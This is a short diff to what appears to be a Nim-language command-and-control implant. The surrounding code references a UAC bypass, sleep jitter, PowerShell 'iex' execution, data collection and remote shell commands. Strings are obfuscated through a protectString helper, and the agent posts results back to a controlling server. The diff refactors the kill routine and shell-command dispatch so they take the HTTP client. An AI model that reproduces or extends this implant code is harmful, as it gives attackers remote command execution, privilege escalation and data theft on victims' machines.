@@ -40,7 +40,6 @@ proc uac_bypass(bypass_method: string, cmd: string, keep_or_die: string): bool
 proc msgbox(title: string, text: string): bool
 proc speak(text: string): bool
 proc change_sleep_time(timeframe: int,  jitter_percent: int): bool
-proc kill_agent(): void
 
 # Helpers
 proc get_agent_id(): string
@@ -544,12 +543,6 @@ proc change_sleep_time(timeframe: int,  jitter_percent: int): bool =
     return is_success
 
 
-proc kill_agent(): void =
-    
-    discard post_data(client, protectString("kill") , """{"Good bye": ":("}""")
-    ExitProcess(0)
-
-
 #########################
 ######## Helpers ########
 #########################
@@ -599,8 +592,9 @@ proc parse_command(command: JsonNode): bool =
     var command_type = command[protectString("command_type")].getStr()
 
     case command_type:
+        # for external common procs - pass the http client as first argument
         of protectString("cmd"):
-            is_success = run_shell_command(command[protectString("shell_command")].getStr())
+            is_success = run_shell_command(client, command[protectString("shell_command")].getStr())
         of protectString("iex"):
             # direct iex
             if not contains(command, protectString("ps_module")):
@@ -647,7 +641,7 @@ proc parse_command(command: JsonNode): bool =
         of protectString("collect"):
             is_success = collect_data()
         of protectString("kill"):
-            kill_agent()
+            kill_agent(client)
 
         else:
             is_success = false
